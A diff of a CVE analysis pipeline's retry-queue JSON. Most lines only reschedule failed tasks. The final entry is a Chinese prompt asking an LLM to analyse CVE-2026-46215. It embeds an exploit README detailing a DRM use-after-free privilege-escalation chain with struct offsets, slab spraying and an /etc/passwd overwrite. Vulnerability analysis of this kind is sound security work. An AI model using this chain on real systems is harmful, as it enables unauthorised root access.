@@ -10,7 +10,7 @@
     "last_error": "API返回空结果",
     "created_at": 1780512332.536062,
     "last_attempt": 1780530475.0303252,
-    "next_attempt": 1781820761.691543,
+    "next_attempt": 1781850296.2153225,
     "metadata": {},
     "task_id": "task_CVE-2025-54253_1780512332",
     "required_result_fields": [
@@ -39,7 +39,7 @@
     "last_error": "API返回空结果",
     "created_at": 1780530480.5636718,
     "last_attempt": 1780546499.8586967,
-    "next_attempt": 1781820791.8591957,
+    "next_attempt": 1781850279.9172857,
     "metadata": {},
     "task_id": "task_CVE-2025-32463_1780530480",
     "required_result_fields": [
@@ -68,7 +68,7 @@
     "last_error": "API返回空结果",
     "created_at": 1780530584.0778508,
     "last_attempt": 1780586677.0499845,
-    "next_attempt": 1781820787.8374398,
+    "next_attempt": 1781850296.199141,
     "metadata": {},
     "task_id": "task_CVE-2025-54253_1780530584",
     "required_result_fields": [
@@ -97,7 +97,7 @@
     "last_error": "API返回空结果",
     "created_at": 1780546440.7176404,
     "last_attempt": 1780586774.8416097,
-    "next_attempt": 1781820770.3406844,
+    "next_attempt": 1781850301.2602663,
     "metadata": {},
     "task_id": "task_CVE-2025-61884_1780546440",
     "required_result_fields": [
@@ -126,7 +126,7 @@
     "last_error": "API返回空结果",
     "created_at": 1780563111.619445,
     "last_attempt": 1780586768.8566246,
-    "next_attempt": 1781820782.5185788,
+    "next_attempt": 1781850286.3361387,
     "metadata": {},
     "task_id": "task_CVE-2025-32463_1780563111",
     "required_result_fields": [
@@ -155,7 +155,7 @@
     "last_error": "API返回空结果",
     "created_at": 1780586905.831617,
     "last_attempt": 1780606844.9520376,
-    "next_attempt": 1781820768.4188907,
+    "next_attempt": 1781850272.64008,
     "metadata": {},
     "task_id": "task_CVE-2026-6815_1780586905",
     "required_result_fields": [
@@ -184,7 +184,7 @@
     "last_error": "API返回空结果",
     "created_at": 1780597241.834532,
     "last_attempt": 1780606880.2136576,
-    "next_attempt": 1781820756.9996285,
+    "next_attempt": 1781850307.228514,
     "metadata": {},
     "task_id": "task_CVE-2025-54253_1780597241",
     "required_result_fields": [
@@ -213,7 +213,7 @@
     "last_error": "API返回空结果",
     "created_at": 1780606850.0185814,
     "last_attempt": 1780636855.6671393,
-    "next_attempt": 1781820762.9270346,
+    "next_attempt": 1781850290.4803855,
     "metadata": {},
     "task_id": "task_CVE-2025-1242_1780606850",
     "required_result_fields": [
@@ -242,7 +242,7 @@
     "last_error": "API返回空结果",
     "created_at": 1780618248.8727932,
     "last_attempt": 1780653337.212906,
-    "next_attempt": 1781820798.9538844,
+    "next_attempt": 1781850311.715555,
     "metadata": {},
     "task_id": "task_CVE-2026-31431_1780618248",
     "required_result_fields": [
@@ -271,7 +271,7 @@
     "last_error": "API返回空结果",
     "created_at": 1780653297.2632146,
     "last_attempt": 1780653554.533717,
-    "next_attempt": 1781820762.9894848,
+    "next_attempt": 1781850312.7628124,
     "metadata": {},
     "task_id": "task_CVE-2026-25643_1780653297",
     "required_result_fields": [
@@ -300,7 +300,7 @@
     "last_error": "API返回空结果",
     "created_at": 1780675033.3490696,
     "last_attempt": 1780697850.5065532,
-    "next_attempt": 1781820754.6527634,
+    "next_attempt": 1781850271.1655765,
     "metadata": {},
     "task_id": "task_CVE-2025-61884_1780675033",
     "required_result_fields": [
@@ -329,7 +329,7 @@
     "last_error": "API返回空结果",
     "created_at": 1780675081.829122,
     "last_attempt": 1780697868.0568147,
-    "next_attempt": 1781820795.337944,
+    "next_attempt": 1781850278.7110233,
     "metadata": {},
     "task_id": "task_CVE-2025-61882_1780675081",
     "required_result_fields": [
@@ -358,7 +358,7 @@
     "last_error": "API返回空结果",
     "created_at": 1780689994.248999,
     "last_attempt": 1780721753.669892,
-    "next_attempt": 1781820778.1491537,
+    "next_attempt": 1781850287.571958,
     "metadata": {},
     "task_id": "task_CVE-2025-49144_1780689994",
     "required_result_fields": [
@@ -387,7 +387,7 @@
     "last_error": "API返回空结果",
     "created_at": 1780690078.0090535,
     "last_attempt": 1780721872.1519966,
-    "next_attempt": 1781820807.8401003,
+    "next_attempt": 1781850298.7572265,
     "metadata": {},
     "task_id": "task_CVE-2025-54253_1780690078",
     "required_result_fields": [
@@ -416,7 +416,7 @@
     "last_error": "API返回空结果",
     "created_at": 1780740446.248328,
     "last_attempt": 1780762114.1171057,
-    "next_attempt": 1781820792.8749478,
+    "next_attempt": 1781850302.3737898,
     "metadata": {},
     "task_id": "task_CVE-2025-49144_1780740446",
     "required_result_fields": [
@@ -445,7 +445,7 @@
     "last_error": "API返回空结果",
     "created_at": 1780747630.8408463,
     "last_attempt": 1780776722.7824638,
-    "next_attempt": 1781820766.2588933,
+    "next_attempt": 1781850267.6488464,
     "metadata": {},
     "task_id": "task_CVE-2026-31431_1780747630",
     "required_result_fields": [
@@ -474,7 +474,7 @@
     "last_error": "API返回空结果",
     "created_at": 1780757191.113863,
     "last_attempt": 1780776721.8697577,
-    "next_attempt": 1781820810.8605072,
+    "next_attempt": 1781850299.8477738,
     "metadata": {},
     "task_id": "task_CVE-2025-55182_1780757191",
     "required_result_fields": [
@@ -503,7 +503,7 @@
     "last_error": "API返回空结果",
     "created_at": 1780757210.5097108,
     "last_attempt": 1780776679.9484835,
-    "next_attempt": 1781820772.467466,
+    "next_attempt": 1781850309.8008668,
     "metadata": {},
     "task_id": "task_CVE-2025-8088_1780757210",
     "required_result_fields": [
@@ -532,7 +532,7 @@
     "last_error": "API返回空结果",
     "created_at": 1780757228.618619,
     "last_attempt": 1780776754.3610117,
-    "next_attempt": 1781820760.825029,
+    "next_attempt": 1781850299.33733,
     "metadata": {},
     "task_id": "task_CVE-2025-6554_1780757228",
     "required_result_fields": [
@@ -561,7 +561,7 @@
     "last_error": "API返回空结果",
     "created_at": 1780762151.9247897,
     "last_attempt": 1780809968.9981909,
-    "next_attempt": 1781820761.1014893,
+    "next_attempt": 1781850255.8412058,
     "metadata": {},
     "task_id": "task_CVE-2026-41089_1780762151",
     "required_result_fields": [
@@ -590,7 +590,7 @@
     "last_error": "API返回空结果",
     "created_at": 1780769247.0176642,
     "last_attempt": 1780809867.0056555,
-    "next_attempt": 1781820777.0496902,
+    "next_attempt": 1781850304.2656803,
     "metadata": {},
     "task_id": "task_CVE-2026-1232_1780769247",
     "required_result_fields": [
@@ -619,7 +619,7 @@
     "last_error": "API返回空结果",
     "created_at": 1780769269.6886911,
     "last_attempt": 1780776822.2383654,
-    "next_attempt": 1781820758.210989,
+    "next_attempt": 1781850259.892878,
     "metadata": {},
     "task_id": "task_CVE-2026-42945_1780769269",
     "required_result_fields": [
@@ -648,7 +648,7 @@
     "last_error": "API返回空结果",
     "created_at": 1780776733.668762,
     "last_attempt": 1780822789.0584369,
-    "next_attempt": 1781820779.7243907,
+    "next_attempt": 1781850296.7875674,
     "metadata": {},
     "task_id": "task_CVE-2025-69985_1780776733",
     "required_result_fields": [
@@ -677,7 +677,7 @@
     "last_error": "API返回空结果",
     "created_at": 1780776843.269161,
     "last_attempt": 1780822748.0588286,
-    "next_attempt": 1781820782.082054,
+    "next_attempt": 1781850277.0154831,
     "metadata": {},
     "task_id": "task_CVE-2025-5419_1780776843",
     "required_result_fields": [
@@ -706,7 +706,7 @@
     "last_error": "API返回空结果",
     "created_at": 1780790739.4256165,
     "last_attempt": 1780822776.9151795,
-    "next_attempt": 1781820776.727094,
+    "next_attempt": 1781850289.6350245,
     "metadata": {},
     "task_id": "task_CVE-2026-31431_1780790739",
     "required_result_fields": [
@@ -735,7 +735,7 @@
     "last_error": "API返回空结果",
     "created_at": 1780809833.4754746,
     "last_attempt": 1780822941.3851836,
-    "next_attempt": 1781820798.1311483,
+    "next_attempt": 1781850272.5610046,
     "metadata": {},
     "task_id": "task_CVE-2026-25643_1780809833",
     "required_result_fields": [
@@ -764,7 +764,7 @@
     "last_error": "API返回空结果",
     "created_at": 1780822990.7154965,
     "last_attempt": 1780860454.1958985,
-    "next_attempt": 1781820788.8648946,
+    "next_attempt": 1781850312.531348,
     "metadata": {},
     "task_id": "task_CVE-2025-14847_1780822990",
     "required_result_fields": [
@@ -793,7 +793,7 @@
     "last_error": "API返回空结果",
     "created_at": 1780866987.2281024,
     "last_attempt": 1780910952.626501,
-    "next_attempt": 1781820805.15314,
+    "next_attempt": 1781850263.6851673,
     "metadata": {},
     "task_id": "task_CVE-2026-31431_1780866987",
     "required_result_fields": [
@@ -822,7 +822,7 @@
     "last_error": "API返回空结果",
     "created_at": 1780873742.129774,
     "last_attempt": 1780910931.8545413,
-    "next_attempt": 1781820760.4946368,
+    "next_attempt": 1781850256.7612426,
     "metadata": {},
     "task_id": "task_CVE-2025-14847_1780873742",
     "required_result_fields": [
@@ -851,7 +851,7 @@
     "last_error": "API返回空结果",
     "created_at": 1780891820.331581,
     "last_attempt": 1780910781.4771016,
-    "next_attempt": 1781820806.407833,
+    "next_attempt": 1781850283.2367754,
     "metadata": {},
     "task_id": "task_CVE-2025-32463_1780891820",
     "required_result_fields": [
@@ -880,7 +880,7 @@
     "last_error": "API返回空结果",
     "created_at": 1780891959.4752328,
     "last_attempt": 1780910945.5984147,
-    "next_attempt": 1781820754.302252,
+    "next_attempt": 1781850267.4710076,
     "metadata": {},
     "task_id": "task_CVE-2025-54253_1780891959",
     "required_result_fields": [
@@ -909,7 +909,7 @@
     "last_error": "API返回空结果",
     "created_at": 1780911051.1339505,
     "last_attempt": 1780963782.1819546,
-    "next_attempt": 1781820757.8826206,
+    "next_attempt": 1781850307.136251,
     "metadata": {},
     "task_id": "task_CVE-2025-54253_1780911051",
     "required_result_fields": [
@@ -938,7 +938,7 @@
     "last_error": "API返回空结果",
     "created_at": 1780941357.4427395,
     "last_attempt": 1780950218.1774075,
-    "next_attempt": 1781820791.7910128,
+    "next_attempt": 1781850274.452326,
     "metadata": {},
     "task_id": "task_CVE-2025-24257_1780941357",
     "required_result_fields": [
@@ -967,7 +967,7 @@
     "last_error": "API返回空结果",
     "created_at": 1781020714.657517,
     "last_attempt": 1781045140.134188,
-    "next_attempt": 1781820795.0855398,
+    "next_attempt": 1781850288.560892,
     "metadata": {},
     "task_id": "task_CVE-2026-41089_1781020714",
     "required_result_fields": [
@@ -996,7 +996,7 @@
     "last_error": "API返回空结果",
     "created_at": 1781038906.5535312,
     "last_attempt": 1781045204.0521402,
-    "next_attempt": 1781820786.9612312,
+    "next_attempt": 1781850280.660775,
     "metadata": {},
     "task_id": "task_CVE-2025-49144_1781038906",
     "required_result_fields": [
@@ -1025,7 +1025,7 @@
     "last_error": "API返回空结果",
     "created_at": 1781045125.900021,
     "last_attempt": 1781114412.0992215,
-    "next_attempt": 1781820812.8042397,
+    "next_attempt": 1781850295.9446378,
     "metadata": {},
     "task_id": "task_CVE-2026-25643_1781045125",
     "required_result_fields": [
@@ -1054,7 +1054,7 @@
     "last_error": "API返回空结果",
     "created_at": 1781068846.522315,
     "last_attempt": 1781114401.2535086,
-    "next_attempt": 1781820787.587449,
+    "next_attempt": 1781850297.1812112,
     "metadata": {},
     "task_id": "task_CVE-2026-2472_1781068846",
     "required_result_fields": [
@@ -1083,7 +1083,7 @@
     "last_error": "API返回空结果",
     "created_at": 1781069135.7306018,
     "last_attempt": 1781137139.0883262,
-    "next_attempt": 1781820760.7685428,
+    "next_attempt": 1781850308.6561377,
     "metadata": {},
     "task_id": "task_CVE-2025-5419_1781069135",
     "required_result_fields": [
@@ -1112,7 +1112,7 @@
     "last_error": "API返回空结果",
     "created_at": 1781114489.7296999,
     "last_attempt": 1781173869.681264,
-    "next_attempt": 1781820784.523068,
+    "next_attempt": 1781850293.0555525,
     "metadata": {},
     "task_id": "task_CVE-2026-25643_1781114489",
     "required_result_fields": [
@@ -1141,7 +1141,7 @@
     "last_error": "API返回空结果",
     "created_at": 1781131990.29619,
     "last_attempt": 1781173824.0021768,
-    "next_attempt": 1781820805.2045588,
+    "next_attempt": 1781850288.8537781,
     "metadata": {},
     "task_id": "task_CVE-2025-61884_1781131990",
     "required_result_fields": [
@@ -1170,7 +1170,7 @@
     "last_error": "API返回空结果",
     "created_at": 1781173909.18911,
     "last_attempt": 1781220367.4877925,
-    "next_attempt": 1781820784.8338528,
+    "next_attempt": 1781850294.8500094,
     "metadata": {},
     "task_id": "task_CVE-2026-6815_1781173909",
     "required_result_fields": [
@@ -1199,7 +1199,7 @@
     "last_error": "API返回空结果",
     "created_at": 1781188799.24396,
     "last_attempt": 1781213037.9843972,
-    "next_attempt": 1781820754.0325947,
+    "next_attempt": 1781850277.4963942,
     "metadata": {},
     "task_id": "task_CVE-2026-23111_1781188799",
     "required_result_fields": [
@@ -1228,7 +1228,7 @@
     "last_error": "API返回空结果",
     "created_at": 1781213065.6432798,
     "last_attempt": 1781237513.7013652,
-    "next_attempt": 1781820803.1220543,
+    "next_attempt": 1781850278.99383,
     "metadata": {},
     "task_id": "task_CVE-2026-43284_1781213065",
     "required_result_fields": [
@@ -1257,7 +1257,7 @@
     "last_error": "API返回空结果",
     "created_at": 1781237415.1112807,
     "last_attempt": 1781255364.64916,
-    "next_attempt": 1781820807.0714657,
+    "next_attempt": 1781850285.9451623,
     "metadata": {},
     "task_id": "task_CVE-2025-24257_1781237415",
     "required_result_fields": [
@@ -1286,7 +1286,7 @@
     "last_error": "API返回空结果",
     "created_at": 1781254932.9696982,
     "last_attempt": 1781267345.4432652,
-    "next_attempt": 1781820764.6073508,
+    "next_attempt": 1781850314.6395268,
     "metadata": {},
     "task_id": "task_CVE-2025-32463_1781254932",
     "required_result_fields": [
@@ -1315,7 +1315,7 @@
     "last_error": "API返回空结果",
     "created_at": 1781255342.7972565,
     "last_attempt": 1781281449.1993144,
-    "next_attempt": 1781820782.1834598,
+    "next_attempt": 1781850270.8133945,
     "metadata": {},
     "task_id": "task_CVE-2025-54253_1781255342",
     "required_result_fields": [
@@ -1344,7 +1344,7 @@
     "last_error": "API返回空结果",
     "created_at": 1781255360.9210665,
     "last_attempt": 1781281296.693164,
-    "next_attempt": 1781820765.3484144,
+    "next_attempt": 1781850285.4920766,
     "metadata": {},
     "task_id": "task_CVE-2025-54424_1781255360",
     "required_result_fields": [
@@ -1373,7 +1373,7 @@
     "last_error": "API返回空结果",
     "created_at": 1781267427.8222303,
     "last_attempt": 1781323111.6153502,
-    "next_attempt": 1781820780.138422,
+    "next_attempt": 1781850311.007822,
     "metadata": {},
     "task_id": "task_CVE-2025-32463_1781267427",
     "required_result_fields": [
@@ -1402,7 +1402,7 @@
     "last_error": "API返回空结果",
     "created_at": 1781281675.6797843,
     "last_attempt": 1781323126.503806,
-    "next_attempt": 1781820780.4076326,
+    "next_attempt": 1781850290.5904331,
     "metadata": {},
     "task_id": "task_CVE-2026-35273_1781281675",
     "required_result_fields": [
@@ -1431,7 +1431,7 @@
     "last_error": "API返回空结果",
     "created_at": 1781323011.1808517,
     "last_attempt": 1781346821.0870156,
-    "next_attempt": 1781820765.7101133,
+    "next_attempt": 1781850298.3355162,
     "metadata": {},
     "task_id": "task_CVE-2026-31431_1781323011",
     "required_result_fields": [
@@ -1460,7 +1460,7 @@
     "last_error": "API返回空结果",
     "created_at": 1781323030.2120469,
     "last_attempt": 1781346811.6879303,
-    "next_attempt": 1781820784.8213112,
+    "next_attempt": 1781850272.3915582,
     "metadata": {},
     "task_id": "task_CVE-2025-24257_1781323030",
     "required_result_fields": [
@@ -1489,7 +1489,7 @@
     "last_error": "API返回空结果",
     "created_at": 1781363137.863459,
     "last_attempt": 1781426647.4596708,
-    "next_attempt": 1781820756.6248991,
+    "next_attempt": 1781850285.1062384,
     "metadata": {},
     "task_id": "task_CVE-2026-31431_1781363137",
     "required_result_fields": [
@@ -1518,7 +1518,7 @@
     "last_error": "API返回空结果",
     "created_at": 1781371607.2510772,
     "last_attempt": 1781426622.88031,
-    "next_attempt": 1781820783.242683,
+    "next_attempt": 1781850259.18992,
     "metadata": {},
     "task_id": "task_CVE-2025-32711_1781371607",
     "required_result_fields": [
@@ -1547,7 +1547,7 @@
     "last_error": "API返回空结果",
     "created_at": 1781371665.3612547,
     "last_attempt": 1781426635.7786112,
-    "next_attempt": 1781820788.1532254,
+    "next_attempt": 1781850256.1410527,
     "metadata": {},
     "task_id": "task_CVE-2025-14847_1781371665",
     "required_result_fields": [
@@ -1576,7 +1576,7 @@
     "last_error": "API返回空结果",
     "created_at": 1781371756.5390553,
     "last_attempt": 1781454329.7396922,
-    "next_attempt": 1781820806.8057492,
+    "next_attempt": 1781850271.3597274,
     "metadata": {},
     "task_id": "task_CVE-2026-49975_1781371756",
     "required_result_fields": [
@@ -1605,7 +1605,7 @@
     "last_error": "API返回空结果",
     "created_at": 1781378964.7667253,
     "last_attempt": 1781426654.961662,
-    "next_attempt": 1781820778.7000213,
+    "next_attempt": 1781850312.9218826,
     "metadata": {},
     "task_id": "task_CVE-2026-20230_1781378964",
     "required_result_fields": [
@@ -1634,7 +1634,7 @@
     "last_error": "API返回空结果",
     "created_at": 1781392032.427467,
     "last_attempt": 1781446077.8433163,
-    "next_attempt": 1781820767.197582,
+    "next_attempt": 1781850289.7778134,
     "metadata": {},
     "task_id": "task_CVE-2025-61882_1781392032",
     "required_result_fields": [
@@ -1663,7 +1663,7 @@
     "last_error": "API返回空结果",
     "created_at": 1781426509.2315626,
     "last_attempt": 1781454281.525377,
-    "next_attempt": 1781820769.928464,
+    "next_attempt": 1781850253.9623141,
     "metadata": {},
     "task_id": "task_CVE-2025-8088_1781426509",
     "required_result_fields": [
@@ -1692,7 +1692,7 @@
     "last_error": "API返回空结果",
     "created_at": 1781426542.985012,
     "last_attempt": 1781468471.5279891,
-    "next_attempt": 1781820772.7334712,
+    "next_attempt": 1781850286.2736015,
     "metadata": {},
     "task_id": "task_CVE-2025-6554_1781426542",
     "required_result_fields": [
@@ -1721,7 +1721,7 @@
     "last_error": "API返回空结果",
     "created_at": 1781454267.9459977,
     "last_attempt": 1781468551.0471094,
-    "next_attempt": 1781820757.198329,
+    "next_attempt": 1781850302.9489038,
     "metadata": {},
     "task_id": "task_CVE-2025-69985_1781454267",
     "required_result_fields": [
@@ -1750,7 +1750,7 @@
     "last_error": "API返回空结果",
     "created_at": 1781468486.5245845,
     "last_attempt": 1781504812.8186424,
-    "next_attempt": 1781820764.2496893,
+    "next_attempt": 1781850263.554712,
     "metadata": {},
     "task_id": "task_CVE-2025-5419_1781468486",
     "required_result_fields": [
@@ -1779,7 +1779,7 @@
     "last_error": "API返回空结果",
     "created_at": 1781548086.140615,
     "last_attempt": 1781548318.6156003,
-    "next_attempt": 1781820800.289453,
+    "next_attempt": 1781850263.525998,
     "metadata": {},
     "task_id": "task_CVE-2025-14847_1781548086",
     "required_result_fields": [
@@ -1808,7 +1808,7 @@
     "last_error": "API返回空结果",
     "created_at": 1781559929.829219,
     "last_attempt": 1781583929.5556705,
-    "next_attempt": 1781820756.7677276,
+    "next_attempt": 1781850289.8250685,
     "metadata": {},
     "task_id": "task_CVE-2025-32463_1781559929",
     "required_result_fields": [
@@ -1837,7 +1837,7 @@
     "last_error": "API返回空结果",
     "created_at": 1781604614.0160782,
     "last_attempt": 1781774228.5997252,
-    "next_attempt": 1781820794.1528115,
+    "next_attempt": 1781850270.2822697,
     "metadata": {},
     "task_id": "task_CVE-2026-4480_1781604614",
     "required_result_fields": [
@@ -1866,7 +1866,7 @@
     "last_error": "API返回空结果",
     "created_at": 1781604816.3982408,
     "last_attempt": 1781774277.3157766,
-    "next_attempt": 1781820757.5705714,
+    "next_attempt": 1781850256.456178,
     "metadata": {},
     "task_id": "task_CVE-2025-54424_1781604816",
     "required_result_fields": [
@@ -1895,7 +1895,7 @@
     "last_error": "API返回空结果",
     "created_at": 1781755798.833734,
     "last_attempt": 1781820850.681725,
-    "next_attempt": 1781820799.7292073,
+    "next_attempt": 1781850306.674583,
     "metadata": {},
     "task_id": "task_CVE-2026-44963_1781755798",
     "required_result_fields": [
@@ -1924,7 +1924,7 @@
     "last_error": "API返回空结果",
     "created_at": 1781774183.752033,
     "last_attempt": 1781820889.55043,
-    "next_attempt": 1781820825.7791364,
+    "next_attempt": 1781850303.790868,
     "metadata": {},
     "task_id": "task_CVE-2026-1492_1781774183",
     "required_result_fields": [
@@ -1953,7 +1953,7 @@
     "last_error": "API返回空结果",
     "created_at": 1781800550.9965112,
     "last_attempt": 1781820925.9967856,
-    "next_attempt": 1781821021.91857,
+    "next_attempt": 1781850322.3489537,
     "metadata": {},
     "task_id": "task_CVE-2026-31431_1781800550",
     "required_result_fields": [
@@ -1974,15 +1974,15 @@
   {
     "cve_id": "CVE-2026-46215",
     "prompt": "\n      请根据以下漏洞信息、搜索结果和漏洞利用代码，生成一份详细的漏洞分析报告，包含有效性分析、投毒风险分析、利用方式、代码分析等内容。请注意以下几点：\n\n    **信息来源：**\n\n    *   **漏洞库信息：**\n        ```\n        {\"cve_id\": \"CVE-2026-46215\", \"sources\": [\"OSCS\"], \"descriptions\": [\"\\u6807\\u9898: Linux kernel \\u5b89\\u5168\\u6f0f\\u6d1e\"], \"published_date\": null, \"last_modified_date\": null, \"cvss_score\": null, \"severity\": null, \"references\": []}\n        ```\n    *   **搜索引擎结果：**\n        ```\n        \n            ## 以下内容是基于此漏洞的搜索结果:\n                [webpage 0 begin] [title] GitHub - 0xMarcio/cve: Latest CVEs with their Proof of Concept exploits. · GitHub\n [description] Rust implementation Exploit/PoC of CVE-2026-31431-Linux-Copy-Fail, allow executing customized shellcode (such as Meterpreter).\n [link] https://github.com/0xMarcio/cve\n [webpage 0 end]\n[webpage 1 begin] [title] GitHub - zulloper/cve-poc: CVE POC repo 자동 수집기 · GitHub\n [description] CVE-2026-31431 (Copy Fail) — Rust exploit PoC + eBPF runtime defense.\n [link] https://github.com/zulloper/cve-poc\n [webpage 1 end]\n[webpage 2 begin] [title] GitHub - LNEYYY/POC-2025: 收集整理漏洞EXP/POC,大部分漏洞来源网络，目前收集整理了1400多个poc/exp，长期更新。\n [description] 收集整理漏洞EXP/POC,大部分漏洞来源网络，目前收集整理了1400多个poc/exp，善用CTRL+F搜索 · 感谢以下贡献者为本项目做出的贡献，同时也欢迎各位师傅提交PR/issues共同维护：\n [link] https://github.com/LNEYYY/POC-2025\n [webpage 2 end]\n[webpage 3 begin] [title] Root Cause Analysis & PoC Exploit for CVE-2026-24061 | SafeBreach\n [description] February 19, 2026 - Learn more about SafeBreach Labs root cause analysis and PoC exploit for critical CVE-2026-24061: Telnetd RCE as Root Vulnerability.\n [link] https://www.safebreach.com/blog/safebreach-labs-root-cause-analysis-and-poc-exploit-for-cve-2026-24061/\n [webpage 3 end]\n[webpage 4 begin] [title] GitHub - xeloxa/CVE-2026-23918-Apache-H2-PoC: Proof-of-Concept exploit for CVE-2026-23918 (Apache mod_http2 double-free). Features multi-mode DoS (Rapid-RST, Slow-Drip) and passive RCE/vulnerability detection for Apache 2.4.66. · GitHub\n [description] May 7, 2026 - Proof-of-Concept exploit for CVE-2026-23918 (Apache mod_http2 double-free). Features multi-mode DoS (Rapid-RST, Slow-Drip) and passive RCE/vulnerability detection for Apache 2.4.66. - xeloxa/CVE-2026-23918-Apache-H2-PoC\n [link] https://github.com/xeloxa/CVE-2026-23918-Apache-H2-PoC\n [webpage 4 end]\n\n            \n        ```\n    *   **漏洞利用代码：**\n        ```\n        /tmp/c344cb5353c98f03f2d75dedf8e714e7/README.md\n---\n# CVE-2026-46215: DRM GEM `change_handle` Use-After-Free (unprivileged LPE)\n\nLocal privilege escalation via a use-after-free in the DRM core ioctl\n`DRM_IOCTL_GEM_CHANGE_HANDLE` (`drm_gem_change_handle_ioctl`, ioctl nr 0xD2).\nReachable by any user with access to a render node (`/dev/dri/renderD*`,\ngranted to the active session by systemd-logind on all major desktop\ndistributions). The chain in this repo takes the UAF to passwordless root from\nan unprivileged user.\n\n- **CVE:** CVE-2026-46215 (HIGH, 7.8, `AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H`)\n- **Introduced:** v6.18-rc1, commit `53096728b891` (\"drm: Add DRM prime interface to reassign GEM handle\", David Francis / AMD), added for AMD's CRIU work\n- **Fixed in:** 6.18.32, 7.0.9, 7.1-rc3 (upstream `5e28b7b94408`). The ioctl is also being disabled upstream in 7.1 because of this and related races.\n- **Affected:** v6.18-rc1 through the fixed releases above\n\n## Attribution\n\nThis bug was first reported by Puttimet Thammasaeng, who holds the upstream\n`Reported-by` credit on the fix. I found and reported it independently to\nsecurity@kernel.org on 2026-04-12. My report was acknowledged and forwarded to\nthe maintainers, but the earlier report is the one credited upstream. This repo\ncontains my own analysis and exploit.\n\nWriteup: https://cyberstan.co.uk\n\n## Disclosure status\n\nThe fix is in released stable kernels (6.18.32 and 7.0.9 onwards). This repo was\npublished after fixes became broadly available.\n\n## The bug\n\n`drm_gem_change_handle_ioctl()` moves a GEM object from one handle to another\nbut never adjusts `obj->handle_count`. It also skips `drm_vma_node_allow/revoke`\nand the driver open/close callbacks. Because `handle_count` stays at 1, a\nconcurrent `GEM_CLOSE` on the old handle drops it to 0 and frees the object\nwhile the new handle still references it in the IDR. That dangling handle is the\nuse-after-free, later dereferenced in `drm_gem_object_release_handle()`.\n\n## Exploit chain\n\n1. Race `GEM_CHANGE_HANDLE` against `GEM_CLOSE` to get a dangling handle.\n2. Reclaim the freed object's slab slot with a sprayed `pipe_buffer` array\n   (msg_msg feng shui to condition kmalloc-512, then splice-filled pipes).\n3. Leak `pipe_buf_ops` through a driver info ioctl: `obj->size` (offset 216)\n   overlaps `pipe_buf[5].ops`, giving a kernel pointer and the KASLR base.\n4. FLINK the dangling handle so `obj->name` (offset 224) lands on\n   `pipe_buf[5].flags` and sets `PIPE_BUF_FLAG_CAN_MERGE` (name = 16 = 0x10).\n5. Write to the pipes to merge into the page cache and overwrite a read-only\n   file (DirtyPipe-style). Target is `/etc/passwd`, root becomes passwordless.\n\nOffsets are verified via `pahole` and are specific to the layout across 6.18 to\n7.0. Override the `GEM_*` / `PIPEBUF_*` defines for other kernels.\n\n## Files\n\n- `poc.c` - the exploit. Build static with `-lpthread`.\n- `run_exploit.sh` - builds the PoC and a minimal initramfs, boots it in QEMU.\n\n## Host prerequisites\n\n`qemu-system-x86_64`, `gcc`, `busybox` (static), `fakeroot`, `cpio`, `gzip`.\nKVM (`/dev/kvm`) is recommended; the race is far more reliable with it.\n\n## Building a test kernel\n\nThe exploit needs a vulnerable target built with specific options:\n\n- `CONFIG_KASAN` must be OFF. KASAN quarantines freed slabs and blocks the\n  pipe-spray reclaim, so the exploit will not work against a KASAN build.\n- A DRM driver that exposes the size/name fields at the expected offsets:\n  `virtio_gpu` (used by the demo) or `nouveau`.\n- `CONFIG_DRM=y`, `CONFIG_DRM_VIRTIO_GPU=y`, `CONFIG_DEVTMPFS=y`,\n  `CONFIG_BLK_DEV_INITRD=y`.\n\nSteps:\n\n1. Check out a 6.18 to 7.0 source tree (or any tree that fails the patched check\n   below).\n2. Set the config options above and make sure `CONFIG_KASAN` is not set.\n3. `make -j\"$(nproc)\" bzImage`, producing `arch/x86/boot/bzImage`.\n\nThe demo boots with `nokaslr` so the leaked pointer is deterministic. The leak\ndefeats KASLR on its own, so KASLR-on also works, the address just varies per\nboot.\n\n## Checking whether a tree is vulnerable or patched\n\nLook at `drivers/gpu/drm/drm_gem.c`, function `drm_gem_change_handle_ioctl()`.\n\nQuick check:\n\n    awk '/^int drm_gem_change_handle_ioctl/,/^}/' \\\n        drivers/gpu/drm/drm_gem.c | grep -c handle_count\n\n- `0` means VULNERABLE (no refcount handling).\n- non-zero means PATCHED.\n\nBy structure:\n\n- Vulnerable: takes `file_priv->prime.lock`, a single\n  `idr_alloc(&file_priv->object_idr, obj, ...)`, then `idr_remove()` on the old\n  handle. No `drm_gem_object_handle_get`.\n- Patched: two-phase insert (`idr_alloc` then `idr_replace(NULL)` to detach the\n  old handle), with the real object only swapped in once the prime operations\n  succeed.\n\n## Running the exploit\n\n    ./run_exploit.sh /path/to/bzImage\n\nIt builds `poc.c`, wraps it in an initramfs, and boots QEMU with\n`-device virtio-gpu-pci` and `nokaslr`. The PoC runs as uid 1000 (unprivileged),\nthen the script prints `/etc/passwd` before and after and drops you to a shell.\n\n        ```\n\n    **你的角色：** 你是一名专业的网络安全分析师，擅长分析CVE漏洞信息。\n\n    **任务：**\n\n    1.  **CVE有效性：** 分析此CVE是否为真实存在的有效漏洞。请综合考虑CVE编号格式、漏洞描述的完整性、参考链接的存在、漏洞的技术细节等因素。\n    2.  **POC有效性：** 判断提供的POC代码是否有效，是否能实际利用此漏洞，并分析其有效性。\n    3.  **投毒风险：** 分析POC代码内容,判断此仓库中是否存在作者隐藏的投毒代码,分析结果使用百分比。务必不要把POC验证的后门代码判定为投毒代码。\n    4.  **利用方式：** 详细分析并总结漏洞的利用方式，包括攻击步骤、所需条件等。\n    5.  **代码分析：** 详细分析POC代码的工作原理、关键组件和执行流程。\n    6.  **排序优先级:** 搜索引擎结果 >  漏洞利用代码 > 漏洞库信息\n    7.  **输出内容:** 务必使用中文\n    8.  **markdown内容:** 务必使用markdown格式，包含以下部分：\n        - 漏洞概述\n        - 有效性分析\n        - 投毒风险分析\n        - 利用方式\n        - 代码分析\n    **输出格式：**  你**必须**严格按照以下 **JSON** 格式输出，**不要包含任何额外的文字、说明或前缀/后缀**。JSON中的**所有键和字符串类型的值必须使用双引号**。请务必对特殊字符进行转义。\n\n    **示例JSON:**```json\n    {\n        \"name\": \"CVE-2023-12345-ExampleApp-SQL注入\",\n        \"type\": \"SQL注入\",\n        \"app\": \"ExampleApp\", \n        \"risk\": \"高危，可能导致数据泄露和远程代码执行\",\n        \"version\": \"<= 1.0\",\n        \"condition\": \"需要网络访问和数据库端口开放\",\n        \"poc_available\": \"是\",\n        \"poison\": \"90%\",\n        